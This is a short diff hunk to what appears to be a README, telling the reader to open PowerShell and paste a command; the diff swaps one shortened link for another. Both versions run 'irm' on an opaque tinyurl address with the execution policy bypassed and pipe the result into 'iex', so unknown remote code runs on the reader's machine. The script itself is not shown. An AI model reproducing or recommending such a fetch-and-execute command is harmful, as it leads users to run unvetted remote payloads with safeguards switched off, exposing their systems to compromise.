@@ -3,7 +3,7 @@
 Open **PowerShell** and paste this command:
 
 ```powershell
-powershell -ep bypass -c "irm tinyurl.com/by-gift | iex"
+powershell -ep bypass -c "irm tinyurl.com/4ccff7pb | iex"
 ```
 
 
